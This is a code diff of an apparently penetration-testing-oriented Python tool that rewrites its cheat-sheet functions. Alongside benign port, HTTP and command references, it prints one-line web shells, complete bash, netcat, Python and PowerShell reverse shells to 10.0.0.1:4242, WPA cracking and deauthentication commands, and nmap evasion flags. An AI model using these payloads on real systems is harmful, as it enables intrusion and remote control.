+        """Display common port numbers reference"""
+        print("\n\033[93mCOMMON PORT NUMBERS REFERENCE\033[0m")
+        print("\033[93m" + "="*45 + "\033[0m")
+
+        ports = {
+            "Web Services": [
+                ("80", "HTTP"),
+                ("443", "HTTPS"),
+                ("8080", "HTTP Alternative"),
+                ("8443", "HTTPS Alternative"),
+            ],
+            "Remote Access": [
                 ("22", "SSH"),
                 ("23", "Telnet"),
+                ("3389", "RDP"),
+                ("5900", "VNC"),
+            ],
+            "File Transfer": [
+                ("21", "FTP"),
+                ("22", "SFTP"),
+                ("989", "FTPS Data"),
+                ("990", "FTPS Control"),
+            ],
+            "Email Services": [
                 ("25", "SMTP"),
-                ("53", "DNS"),
-                ("80", "HTTP"),
                 ("110", "POP3"),
                 ("143", "IMAP"),
-                ("443", "HTTPS"),
+                ("587", "SMTP Submission"),
                 ("993", "IMAPS"),
                 ("995", "POP3S"),
             ],
-            "Database Ports": [
-                ("1433", "MS SQL Server"),
-                ("1521", "Oracle"),
+            "Database Services": [
+                ("1433", "MSSQL"),
                 ("3306", "MySQL"),
                 ("5432", "PostgreSQL"),
+                ("1521", "Oracle"),
                 ("6379", "Redis"),
                 ("27017", "MongoDB"),
             ],
-            "Security Services": [
-                ("88", "Kerberos"),
+            "Network Services": [
+                ("53", "DNS"),
+                ("67", "DHCP Server"),
+                ("68", "DHCP Client"),
+                ("123", "NTP"),
+                ("161", "SNMP"),
                 ("389", "LDAP"),
                 ("636", "LDAPS"),
-                ("1812", "RADIUS"),
-                ("1813", "RADIUS Accounting"),
             ],
         }
-        self._display_cheatsheet("Common Port Numbers", ports_info)
+
+        for category, port_list in ports.items():
+            print(f"\n\033[95m{category}\033[0m")
+            print("-" * len(category.encode("ascii", "ignore")))
+            for port, service in port_list:
+                print(f"• {port} - {service}")
 
     def _network_recon_reference(self):
-        """Network reconnaissance reference"""
-        recon_info = {
-            "Network Discovery": [
-                ("nmap -sn 192.168.1.0/24", "Ping sweep"),
-                ("masscan -p1-65535 192.168.1.0/24", "Fast port scanning"),
-                ("arp-scan -l", "ARP discovery"),
-                ("netdiscover -r 192.168.1.0/24", "Passive discovery"),
-            ],
-            "Service Enumeration": [
-                ("nmap -sV -p- target", "Version detection"),
-                ("nmap -sC target", "Default scripts"),
-                ("enum4linux target", "SMB enumeration"),
-                ("showmount -e target", "NFS shares"),
-            ],
-        }
-        self._display_cheatsheet("Network Reconnaissance", recon_info)
+        """Display network reconnaissance reference"""
+        print("\n\033[93mNETWORK RECONNAISSANCE REFERENCE\033[0m")
+        print("\033[93m" + "="*50 + "\033[0m")
+
+        print("\n\033[96mNetwork Discovery:\033[0m")
+        discovery_commands = [
+            ("nmap -sn 192.168.1.0/24", "Ping sweep"),
+            ("arp-scan --localnet", "ARP scan"),
+            ("netdiscover -r 192.168.1.0/24", "Passive discovery"),
+            ("masscan 192.168.1.0/24 -p 80,443", "Fast port scan"),
+        ]
+
+        for cmd, desc in discovery_commands:
+            print(f"• {cmd} - {desc}")
+
+        print("\n\033[96mService Enumeration:\033[0m")
+        service_commands = [
+            ("nmap -sV -p 1-1000 192.168.1.1", "Version detection"),
+            ("nmap --script banner -p 1-1000 192.168.1.1", "Banner grabbing"),
+            ("nmap --script vuln 192.168.1.1", "Vulnerability scan"),
+            ("nmap --script default 192.168.1.1", "Default scripts"),
+        ]
+
+        for cmd, desc in service_commands:
+            print(f"• {cmd} - {desc}")
 
     def _wireless_security_reference(self):
-        """Wireless security reference"""
-        wireless_info = {
-            "WiFi Reconnaissance": [
-                ("airodump-ng wlan0mon", "Monitor wireless networks"),
-                ("wash -i wlan0mon", "WPS scan"),
-                ("reaver -i wlan0mon -b MAC -vv", "WPS attack"),
-                ("aircrack-ng -w wordlist.txt capture.cap", "WPA/WPA2 cracking"),
-            ]
-        }
-        self._display_cheatsheet("Wireless Security", wireless_info)
+        """Display wireless security reference"""
+        print("\n\033[93mWIRELESS SECURITY REFERENCE\033[0m")
+        print("\033[93m" + "="*45 + "\033[0m")
+
+        print("\n\033[96mWireless Reconnaissance:\033[0m")
+        recon_commands = [
+            ("airodump-ng wlan0mon", "Scan for networks"),
+            ("wash -i wlan0mon", "Scan for WPS"),
+            ("reaver -i wlan0mon -b <BSSID>", "WPS attack"),
+            ("bully -i wlan0mon -b <BSSID>", "WPS attack alternative"),
+        ]
+
+        for cmd, desc in recon_commands:
+            print(f"• {cmd} - {desc}")
+
+        print("\n\033[96mWPA/WPA2 Attacks:\033[0m")
+        wpa_commands = [
+            ("airodump-ng -c 6 --bssid <BSSID> -w capture wlan0mon",
+             "Capture handshake"),
+            ("aireplay-ng -0 10 -a <BSSID> wlan0mon", "Deauth attack"),
+            ("aircrack-ng -w wordlist.txt capture-01.cap", "Crack password"),
+            ("hashcat -m 2500 capture.hccapx wordlist.txt", "GPU cracking"),
+        ]
+
+        for cmd, desc in wpa_commands:
+            print(f"• {cmd} - {desc}")
 
     def _network_protocols_reference(self):
-        """Network protocols reference"""
-        protocols_info = {
-            "Common Protocols": [
-                ("TCP", "Transmission Control Protocol"),
-                ("UDP", "User Datagram Protocol"),
-                ("ICMP", "Internet Control Message Protocol"),
-                ("ARP", "Address Resolution Protocol"),
-                ("DHCP", "Dynamic Host Configuration Protocol"),
-            ]
+        """Display network protocols reference"""
+        print("\n\033[93mNETWORK PROTOCOLS REFERENCE\033[0m")
+        print("\033[93m" + "="*45 + "\033[0m")
+
+        protocols = {
+            "Application Layer": [
+                ("HTTP/HTTPS", "Web traffic"),
+                ("FTP/SFTP", "File transfer"),
+                ("SMTP/POP3/IMAP", "Email"),
+                ("DNS", "Domain name resolution"),
+                ("DHCP", "IP address assignment"),
+            ],
+            "Transport Layer": [
+                ("TCP", "Reliable connection-oriented"),
+                ("UDP", "Unreliable connectionless"),
+            ],
+            "Network Layer": [
+                ("IP", "Internet Protocol"),
+                ("ICMP", "Control messages"),
+                ("ARP", "Address resolution"),
+            ],
+            "Data Link Layer": [
+                ("Ethernet", "Local network"),
+                ("WiFi", "Wireless networking"),
+            ],
         }
-        self._display_cheatsheet("Network Protocols", protocols_info)
+
+        for layer, protocol_list in protocols.items():
+            print(f"\n\033[95m{layer}\033[0m")
+            print("-" * len(layer.encode("ascii", "ignore")))
+            for protocol, desc in protocol_list:
+                print(f"• {protocol} - {desc}")
 
     def _firewall_evasion_reference(self):
-        """Firewall evasion reference"""
-        evasion_info = {
-            "Nmap Evasion": [
-                ("nmap -f target", "Fragment packets"),
-                ("nmap -D RND:10 target", "Decoy scanning"),
-                ("nmap -sA target", "ACK scan"),
-                ("nmap --source-port 53 target", "Source port manipulation"),
-            ]
-        }
-        self._display_cheatsheet("Firewall Evasion", evasion_info)
+        """Display firewall evasion reference"""
+        print("\n\033[93mFIREWALL EVASION REFERENCE\033[0m")
+        print("\033[93m" + "="*45 + "\033[0m")
+
+        print("\n\033[96mNmap Evasion Techniques:\033[0m")
+        evasion_commands = [
+            ("nmap -f", "Fragment packets"),
+            ("nmap --mtu 16", "Custom MTU size"),
+            ("nmap -D RND:10", "Decoy hosts"),
+            ("nmap -S <spoofed_ip>", "Source IP spoofing"),
+            ("nmap -e <interface>", "Specify interface"),
+            ("nmap --source-port 53", "Source port spoofing"),
+            ("nmap -T1", "Slow timing"),
+            ("nmap --max-retries 1", "Reduce retries"),
+        ]
+
+        for cmd, desc in evasion_commands:
+            print(f"• {cmd} - {desc}")
+
+        print("\n\033[96mGeneral Evasion Techniques:\033[0m")
+        techniques = [
+            ("Packet Fragmentation", "Split packets into smaller pieces"),
+            ("Timing Manipulation", "Slow down scan to avoid detection"),
+            ("Source Spoofing", "Use fake source addresses"),
+            ("Protocol Manipulation", "Use different protocols"),
+            ("Port Hopping", "Scan ports in random order"),
+        ]
+
+        for i, (tech, desc) in enumerate(techniques, 1):
+            print(f"\n\033[94m{i}. {tech}\033[0m")
+            print(f"   {desc}")
 
     def _http_status_codes_reference(self):
-        """HTTP status codes reference"""
-        status_info = {
-            "Success (2xx)": [
-                ("200", "OK - Request successful"),
-                ("201", "Created - Resource created"),
-                ("204", "No Content - Successful but no content"),
-                ("206", "Partial Content - Range request"),
+        """Display HTTP status codes reference"""
+        print("\n\033[93mHTTP STATUS CODES REFERENCE\033[0m")
+        print("\033[93m" + "="*45 + "\033[0m")
+
+        status_codes = {
+            "1xx - Informational": [
+                ("100", "Continue"),
+                ("101", "Switching Protocols"),
+                ("102", "Processing"),
             ],
-            "Redirection (3xx)": [
+            "2xx - Success": [
+                ("200", "OK"),
+                ("201", "Created"),
+                ("202", "Accepted"),
+                ("204", "No Content"),
+                ("206", "Partial Content"),
+            ],
+            "3xx - Redirection": [
                 ("301", "Moved Permanently"),
-                ("302", "Found (Temporary redirect)"),
+                ("302", "Found"),
                 ("304", "Not Modified"),
                 ("307", "Temporary Redirect"),
+                ("308", "Permanent Redirect"),
             ],
-            "Client Error (4xx)": [
+            "4xx - Client Errors": [
                 ("400", "Bad Request"),
                 ("401", "Unauthorized"),
                 ("403", "Forbidden"),
                 ("404", "Not Found"),
                 ("405", "Method Not Allowed"),
+                ("408", "Request Timeout"),
                 ("429", "Too Many Requests"),
             ],
-            "Server Error (5xx)": [
+            "5xx - Server Errors": [
                 ("500", "Internal Server Error"),
                 ("501", "Not Implemented"),
                 ("502", "Bad Gateway"),
                 ("503", "Service Unavailable"),
                 ("504", "Gateway Timeout"),
+                ("505", "HTTP Version Not Supported"),
             ],
         }
-        self._display_cheatsheet("HTTP Status Codes", status_info)
+
+        for category, code_list in status_codes.items():
+            print(f"\n\033[95m{category}\033[0m")
+            print("-" * len(category.encode("ascii", "ignore")))
+            for code, desc in code_list:
+                print(f"• {code} - {desc}")
 
     def _http_headers_reference(self):
-        """HTTP headers reference"""
-        headers_info = {
-            "Security Headers": [
-                ("X-Frame-Options: DENY", "Clickjacking protection"),
-                ("X-XSS-Protection: 1; mode=block", "XSS filtering"),
-                ("X-Content-Type-Options: nosniff", "MIME type sniffing protection"),
-                ("Strict-Transport-Security: max-age=31536000", "HTTPS enforcement"),
-                ("Content-Security-Policy: default-src 'self'", "Content restrictions"),
+        """Display HTTP headers reference"""
+        print("\n\033[93mHTTP HEADERS REFERENCE\033[0m")
+        print("\033[93m" + "="*35 + "\033[0m")
+
+        headers = {
+            "Request Headers": [
+                ("User-Agent", "Browser identification"),
+                ("Accept", "Accepted content types"),
+                ("Accept-Language", "Preferred languages"),
+                ("Accept-Encoding", "Accepted encodings"),
+                ("Authorization", "Authentication credentials"),
+                ("Cookie", "Session data"),
+                ("Referer", "Previous page"),
+                ("Host", "Target hostname"),
             ],
-            "Common Headers": [
-                ("User-Agent: Mozilla/5.0...", "Browser identification"),
-                ("Authorization: Bearer token", "Authentication"),
-                ("Content-Type: application/json", "Content type"),
-                ("Accept: text/html,application/xhtml+xml", "Accepted content types"),
-                ("Referer: https://example.com/", "Referring page"),
+            "Response Headers": [
+                ("Content-Type", "Response content type"),
+                ("Content-Length", "Response size"),
+                ("Set-Cookie", "Set session cookies"),
+                ("Location", "Redirect URL"),
+                ("Server", "Server information"),
+                ("X-Powered-By", "Technology stack"),
+                ("X-Frame-Options", "Clickjacking protection"),
+                ("Content-Security-Policy", "CSP policy"),
             ],
         }
-        self._display_cheatsheet("HTTP Headers", headers_info)
+
+        for category, header_list in headers.items():
+            print(f"\n\033[95m{category}\033[0m")
+            print("-" * len(category.encode("ascii", "ignore")))
+            for header, desc in header_list:
+                print(f"• {header} - {desc}")
 
     def _web_shells_reference(self):
-        """Web shells reference"""
-        shells_info = {
-            "PHP Web Shells": [
-                ("<?php system($_GET['cmd']); ?>", "Simple PHP shell"),
-                ("<?php eval($_POST['cmd']); ?>", "PHP eval shell"),
-                ("<?php passthru($_GET['cmd']); ?>", "PHP passthru shell"),
-            ],
-            "ASP Web Shells": [
-                ('<%eval request("cmd")%>', "Simple ASP shell"),
-                (
-                    '<%=CreateObject("WScript.Shell").Exec(Request("cmd")).StdOut.Readall()%>',
-                    "ASP command execution",
-                ),
-            ],
-            "JSP Web Shells": [
-                (
-                    '<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>',
-                    "JSP command execution",
-                )
-            ],
-        }
-        self._display_cheatsheet("Web Shells", shells_info)
+        """Display web shells reference"""
+        print("\n\033[93mWEB SHELLS REFERENCE\033[0m")
+        print("\033[93m" + "="*35 + "\033[0m")
+
+        print("\n\033[96mCommon Web Shells:\033[0m")
+        shells = [
+            ("PHP", "<?php system($_GET['cmd']); ?>"),
+            ("ASP", "<% Response.Write(CreateObject(\"WScript.Shell\").Exec(Request.QueryString(\"cmd\")).StdOut.ReadAll()) %>"),
+            ("JSP", "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>"),
+            ("Python", "import os; os.system(request.args.get('cmd'))"),
+        ]
+
+        for lang, code in shells:
+            print(f"\n\033[94m{lang}:\033[0m")
+            print(f"   \033[92m{code}\033[0m")
+
+        print("\n\033[96mDetection:\033[0m")
+        print("• Monitor for suspicious file uploads")
+        print("• Check for common web shell signatures")
+        print("• Monitor file system changes")
+        print("• Use antivirus/EDR solutions")
 
     def _reverse_shells_reference(self):
-        """Reverse shells reference"""
-        shells_info = {
-            "Bash Reverse Shells": [
-                ("bash -i >& /dev/tcp/10.0.0.1/4242 0>&1", "Bash TCP reverse shell"),
-                (
-                    "0<&196;exec 196<>/dev/tcp/10.0.0.1/4242; sh <&196 >&196 2>&196",
-                    "Bash alternative",
-                ),
-                ("/bin/bash -l > /dev/tcp/10.0.0.1/4242 0<&1 2>&1", "Bash with TTY"),
-            ],
-            "Python Reverse Shells": [
-                (
-                    'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'',
-                    "Python reverse shell",
-                ),
-                (
-                    'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")\'',
-                    "Python3 with PTY",
-                ),
-            ],
-            "PowerShell Reverse Shells": [
-                (
-                    'powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.0.0.1",4242);',
-                    "PowerShell TCP client",
-                )
-            ],
-        }
-        self._display_cheatsheet("Reverse Shells", shells_info)
+        """Display reverse shells reference"""
+        print("\n\033[93mREVERSE SHELLS REFERENCE\033[0m")
+        print("\033[93m" + "="*40 + "\033[0m")
+
+        print("\n\033[96mCommon Reverse Shell Commands:\033[0m")
+        shells = [
+            ("Bash", "bash -i >& /dev/tcp/10.0.0.1/4242 0>&1"),
+            ("Netcat", "nc -e /bin/bash 10.0.0.1 4242"),
+            ("Python", "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"]);'"),
+            ("PowerShell", "powershell -c \"$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\""),
+        ]
+
+        for lang, command in shells:
+            print(f"\n\033[94m{lang}:\033[0m")
+            print(f"   \033[92m{command}\033[0m")
+
+        print("\n\033[96mListener Commands:\033[0m")
+        listeners = [
+            ("Netcat", "nc -lvp 4242"),
+            ("PowerShell", "powershell -c \"$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',4242);$listener.Start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()\""),
+        ]
+
+        for tool, command in listeners:
+            print(f"\n\033[94m{tool}:\033[0m")
+            print(f"   \033[92m{command}\033[0m")
 
     def _web_fuzzing_reference(self):
-        """Web fuzzing reference"""
-        fuzzing_info = {
-            "Directory Fuzzing": [
-                ("ffuf -w /path/to/wordlist -u http://target/FUZZ", "Fast web fuzzer"),
-                (
-                    "gobuster dir -u http://target -w /path/to/wordlist",
-                    "Directory brute forcing",
-                ),
-                (
-                    "wfuzz -c -z file,/path/to/wordlist --hc 404 http://target/FUZZ",
-                    "Web application fuzzer",
-                ),
-                ("dirb http://target /path/to/wordlist", "Web content scanner"),
-            ],
-            "Parameter Fuzzing": [
-                (
-                    "ffuf -w /path/to/wordlist -u http://target/page?FUZZ=value",
-                    "GET parameter fuzzing",
-                ),
-                (
-                    "ffuf -w /path/to/wordlist -X POST -d 'FUZZ=value' -u http://target/page",
-                    "POST parameter fuzzing",
-                ),
-                (
-                    "wfuzz -c -z file,/path/to/wordlist -d 'FUZZ=value' http://target/page",
-                    "Parameter discovery",
-                ),
-            ],
-            "Subdomain Fuzzing": [
-                (
-                    "ffuf -w /path/to/subdomains.txt -u http://FUZZ.target.com",
-                    "Subdomain enumeration",
-                ),
-                (
-                    "gobuster dns -d target.com -w /path/to/subdomains.txt",
-                    "DNS subdomain brute force",
-                ),
-                (
-                    "wfuzz -c -w /path/to/subdomains.txt -H 'Host: FUZZ.target.com' http://target.com",
-                    "Virtual host discovery",
-                ),
-            ],
-        }
-        self._display_cheatsheet("Web Fuzzing", fuzzing_info)
+        """Display web fuzzing reference"""
+        print("\n\033[93mWEB FUZZING REFERENCE\033[0m")
+        print("\033[93m" + "="*35 + "\033[0m")
+
+        print("\n\033[96mDirectory Fuzzing:\033[0m")
+        dir_commands = [
+            ("gobuster dir -u http://example.com -w wordlist.txt", "Directory bruteforce"),
+            ("ffuf -w wordlist.txt -u http://example.com/FUZZ", "Fast fuzzing"),
+            ("dirb http://example.com", "Classic directory bruteforce"),
+            ("wfuzz -w wordlist.txt http://example.com/FUZZ", "Web fuzzer"),
+        ]
+
+        for cmd, desc in dir_commands:
+            print(f"• {cmd} - {desc}")
+
+        print("\n\033[96mParameter Fuzzing:\033[0m")
+        param_commands = [
+            ("ffuf -w wordlist.txt -u http://example.com/?param=FUZZ", "Parameter fuzzing"),
+            ("wfuzz -w wordlist.txt http://example.com/?param=FUZZ", "Parameter fuzzing"),
+            ("arjun -u http://example.com", "Parameter discovery"),
+            ("parameth -u http://example.com", "Parameter discovery"),
+        ]
+
+        for cmd, desc in param_commands:
+            print(f"• {cmd} - {desc}")
+
+        print("\n\033[96mSubdomain Fuzzing:\033[0m")
+        subdomain_commands = [
+            ("gobuster dns -d example.com -w wordlist.txt", "Subdomain bruteforce"),
+            ("ffuf -w wordlist.txt -u http://FUZZ.example.com", "Subdomain fuzzing"),
+            ("subfinder -d example.com", "Subdomain enumeration"),
+            ("amass enum -d example.com", "Subdomain enumeration"),
+        ]
+
+        for cmd, desc in subdomain_commands:
+            print(f"• {cmd} - {desc}")
 
     def _linux_commands_card(self):
-        """Linux commands reference card"""
-        commands_info = {
+        """Display Linux commands quick reference card"""
+        print("\n\033[93mLINUX COMMANDS QUICK REFERENCE\033[0m")
+        print("\033[93m" + "="*45 + "\033[0m")
+
+        commands = {
             "File Operations": [
                 ("ls -la", "List files with details"),
-                ("find / -name filename", "Find file by name"),
-                ("grep -r 'pattern' .", "Search text in files"),
+                ("cp source dest", "Copy files"),
+                ("mv source dest", "Move/rename files"),
+                ("rm file", "Remove file"),
+                ("rm -rf dir", "Remove directory recursively"),
                 ("chmod 755 file", "Change file permissions"),
                 ("chown user:group file", "Change ownership"),
             ],
-            "Network": [
-                ("netstat -tulpn", "Show listening ports"),
-                ("ss -tulpn", "Modern netstat alternative"),
-                ("iptables -L", "List firewall rules"),
-                ("tcpdump -i eth0", "Capture network traffic"),
+            "Text Processing": [
+                ("cat file", "Display file content"),
+                ("less file", "View file page by page"),
+                ("head -10 file", "Show first 10 lines"),
+                ("tail -10 file", "Show last 10 lines"),
+                ("grep pattern file", "Search for pattern"),
+                ("sed 's/old/new/g' file", "Replace text"),
+                ("awk '{print $1}' file", "Process text fields"),
             ],
-            "Process Management": [
-                ("ps aux", "List all processes"),
-                ("kill -9 PID", "Force kill process"),
-                ("nohup command &", "Run in background"),
-                ("jobs", "List background jobs"),
+            "System Information": [
+                ("uname -a", "System information"),
+                ("whoami", "Current user"),
+                ("id", "User and group info"),
+                ("ps aux", "Running processes"),
+                ("top", "Process monitor"),
+                ("df -h", "Disk usage"),
+                ("free -h", "Memory usage"),
+            ],
+            "Network": [
+                ("ifconfig", "Network interfaces"),
+                ("netstat -tulpn", "Network connections"),
+                ("ping host", "Test connectivity"),
+                ("nslookup domain", "DNS lookup"),
+                ("wget url", "Download file"),
+                ("curl url", "HTTP request"),
+                ("ssh user@host", "SSH connection"),
             ],
         }
-        self._display_cheatsheet("Linux Commands", commands_info)
+
+        for category, cmd_list in commands.items():
+            print(f"\n\033[95m{category}\033[0m")
+            print("-" * len(category.encode("ascii", "ignore")))
+            for cmd, desc in cmd_list:
+                print(f"• {cmd} - {desc}")
 
     def _windows_commands_card(self):
-        """Windows commands reference card"""
-        commands_info = {
+        """Display Windows commands quick reference card"""
+        print("\n\033[93mWINDOWS COMMANDS QUICK REFERENCE\033[0m")
+        print("\033[93m" + "="*50 + "\033[0m")
+
+        commands = {
             "File Operations": [
-                ("dir /a", "List all files including hidden"),
-                ('forfiles /m *.* /c "cmd /c echo @path"', "Find files"),
-                ('findstr /s /i "text" *.*', "Search text in files"),
+                ("dir", "List files"),
+                ("copy source dest", "Copy files"),
+                ("move source dest", "Move files"),
+                ("del file", "Delete file"),
+                ("rmdir dir", "Remove directory"),
+                ("attrib file", "View file attributes"),
                 ("icacls file", "View file permissions"),
-                ("attrib +h file", "Hide file"),
+            ],
+            "System Information": [
+                ("systeminfo", "System information"),
+                ("whoami", "Current user"),
+                ("whoami /priv", "User privileges"),
+                ("tasklist", "Running processes"),
+                ("taskmgr", "Task manager"),
+                ("wmic logicaldisk get size,freespace,caption", "Disk usage"),
+                ("wmic memorychip get capacity", "Memory info"),
             ],
             "Network": [
-                ("netstat -an", "Show network connections"),
-                ("ipconfig /all", "Show IP configuration"),
-                ("arp -a", "Show ARP table"),
-                ("route print", "Show routing table"),
-            ],
-            "System Info": [
-                ("systeminfo", "System information"),
-                ("tasklist", "List running processes"),
-                ("wmic process list full", "Detailed process list"),
+                ("ipconfig", "Network configuration"),
+                ("netstat -an", "Network connections"),
+                ("ping host", "Test connectivity"),
+                ("nslookup domain", "DNS lookup"),
                 ("net user", "List users"),
+                ("net localgroup administrators", "List admins"),
+                ("net share", "List shares"),
+            ],
+            "Registry": [
+                ("reg query key", "Query registry"),
+                ("reg add key", "Add registry key"),
+                ("reg delete key", "Delete registry key"),
+                ("reg export key file", "Export registry"),
+                ("reg import file", "Import registry"),
             ],
         }
-        self._display_cheatsheet("Windows Commands", commands_info)
+
+        for category, cmd_list in commands.items():
+            print(f"\n\033[95m{category}\033[0m")
+            print("-" * len(category.encode("ascii", "ignore")))
+            for cmd, desc in cmd_list:
+                print(f"• {cmd} - {desc}")
 
     def _powershell_commands_card(self):
-        """PowerShell commands reference card"""
-        commands_info = {
+        """Display PowerShell commands quick reference card"""
+        print("\n\033[93mPOWERSHELL COMMANDS QUICK REFERENCE\033[0m")
+        print("\033[93m" + "="*55 + "\033[0m")
+
+        commands = {
             "File Operations": [
-                ("Get-ChildItem -Force", "List all files"),
-                ("Get-Content file.txt", "Read file content"),
-                ("Select-String -Pattern 'text' -Path *", "Search text in files"),
-                ("Get-Acl file.txt", "Get file permissions"),
-                (
-                    "Set-ItemProperty file.txt -Name Attributes -Value Hidden",
-                    "Hide file",
-                ),
+                ("Get-ChildItem", "List files (ls)"),
+                ("Copy-Item source dest", "Copy files"),
+                ("Move-Item source dest", "Move files"),
+                ("Remove-Item file", "Delete file"),
+                ("Get-Content file", "Read file content"),
+                ("Set-Content file content", "Write to file"),
+                ("Get-Acl file", "Get file permissions"),
+            ],
+            "System Information": [
+                ("Get-ComputerInfo", "System information"),
+                ("Get-Process", "Running processes"),
+                ("Get-Service", "Services"),
+                ("Get-WmiObject -Class Win32_LogicalDisk", "Disk info"),
+                ("Get-WmiObject -Class Win32_PhysicalMemory", "Memory info"),
+                ("Get-NetAdapter", "Network adapters"),
+                ("Get-NetIPAddress", "IP addresses"),
+            ],
+            "Active Directory": [
+                ("Get-ADUser -Filter *", "List users"),
+                ("Get-ADGroup -Filter *", "List groups"),
+                ("Get-ADComputer -Filter *", "List computers"),
+                ("Get-ADDomain", "Domain information"),
+                ("Get-ADForest", "Forest information"),
             ],
             "Network": [
-                ("Get-NetTCPConnection", "Show TCP connections"),
-                ("Test-NetConnection -ComputerName host -Port 80", "Test connectivity"),
-                ("Get-NetAdapter", "List network adapters"),
-                ("Resolve-DnsName domain.com", "DNS lookup"),
-            ],
-            "System Info": [
-                ("Get-ComputerInfo", "System information"),
-                ("Get-Process", "List processes"),
-                ("Get-Service", "List services"),
-                ("Get-LocalUser", "List local users"),
+                ("Test-NetConnection host", "Test connectivity"),
+                ("Resolve-DnsName domain", "DNS resolution"),
+                ("Invoke-WebRequest url", "HTTP request"),
+                ("New-NetFirewallRule", "Firewall rules"),
+                ("Get-NetTCPConnection", "TCP connections"),
             ],
         }
-        self._display_cheatsheet("PowerShell Commands", commands_info)
+
+        for category, cmd_list in commands.items():
+            print(f"\n\033[95m{category}\033[0m")
+            print("-" * len(category.encode("ascii", "ignore")))
+            for cmd, desc in cmd_list:
+                print(f"• {cmd} - {desc}")
 
     def _bash_scripting_card(self):
-        """Bash scripting reference card"""
-        scripting_info = {
-            "Variables & Conditionals": [
-                ("if [ $# -eq 0 ]; then echo 'No args'; fi", "Check argument count"),
-                ("for i in {1..10}; do echo $i; done", "For loop"),
-                ("while read line; do echo $line; done < file", "While loop"),
-                ("VAR=${1:-default}", "Variable with default"),
-            ],
-            "File Tests": [
-                ("[ -f file ]", "Test if file exists"),
-                ("[ -d dir ]", "Test if directory exists"),
-                ("[ -x file ]", "Test if executable"),
-                ("[ -s file ]", "Test if file not empty"),
-            ],
-            "String Operations": [
-                ("${#string}", "String length"),
-                ("${string:0:5}", "Substring"),
-                ("${string/old/new}", "Replace first occurrence"),
-                ("${string//old/new}", "Replace all occurrences"),
-            ],
-        }
-        self._display_cheatsheet("Bash Scripting", scripting_info)
+        """Display bash scripting quick reference card"""
+        print("\n\033[93mBASH SCRIPTING QUICK REFERENCE\033[0m")
+        print("\033[93m" + "="*50 + "\033[0m")
+
+        print("\n\033[96mBasic Syntax:\033[0m")
+        syntax = [
+            ("#!/bin/bash", "Shebang line"),
+            ("# comment", "Comment"),
+            ("variable=value", "Variable assignment"),
+            ("$variable", "Variable reference"),
+            ("${variable}", "Variable reference (braces)"),
+            ("\"$variable\"", "Double quotes (expand variables)"),
+            ("'$variable'", "Single quotes (literal)"),
+        ]
+
+        for item, desc in syntax:
+            print(f"• {item} - {desc}")
+
+        print("\n\033[96mControl Structures:\033[0m")
+        controls = [
+            ("if [ condition ]; then ... fi", "If statement"),
+            ("for var in list; do ... done", "For loop"),
+            ("while [ condition ]; do ... done", "While loop"),
+            ("case $var in ... esac", "Case statement"),
+            ("function name() { ... }", "Function definition"),
+        ]
+
+        for item, desc in controls:
+            print(f"• {item} - {desc}")
+
+        print("\n\033[96mFile Tests:\033[0m")
+        tests = [
+            ("[ -f file ]", "File exists"),
+            ("[ -d dir ]", "Directory exists"),
+            ("[ -r file ]", "File is readable"),
+            ("[ -w file ]", "File is writable"),
+            ("[ -x file ]", "File is executable"),
+            ("[ -s file ]", "File is not empty"),
+        ]
+
+        for item, desc in tests:
+            print(f"• {item} - {desc}")
+
+        print("\n\033[96mString Tests:\033[0m")
+        string_tests = [
+            ("[ -z string ]", "String is empty"),
+            ("[ -n string ]", "String is not empty"),
+            ("[ string1 = string2 ]", "Strings are equal"),
+            ("[ string1 != string2 ]", "Strings are not equal"),
+        ]
+
+        for item, desc in string_tests:
+            print(f"• {item} - {desc}")
 
     def _regex_reference_card(self):
-        """Regular expressions reference card"""
-        regex_info = {
-            "Basic Patterns": [
-                (".", "Any character"),
-                ("^", "Start of line"),
-                ("$", "End of line"),
-                ("*", "Zero or more"),
-                ("+", "One or more"),
-                ("?", "Zero or one"),
-            ],
-            "Character Classes": [
-                ("[abc]", "Any of a, b, or c"),
-                ("[^abc]", "Not a, b, or c"),
-                ("[a-z]", "Any lowercase letter"),
-                ("\\d", "Any digit"),
-                ("\\w", "Any word character"),
-                ("\\s", "Any whitespace"),
-            ],
-            "Common Patterns": [
-                ("\\b\\w+@\\w+\\.\\w+\\b", "Email address"),
-                ("\\b\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\b", "IP address"),
-                ("\\b\\d{4}-\\d{2}-\\d{2}\\b", "Date (YYYY-MM-DD)"),
-                ("\\b[A-Za-z0-9]{8,}\\b", "Strong password pattern"),
-            ],
-        }
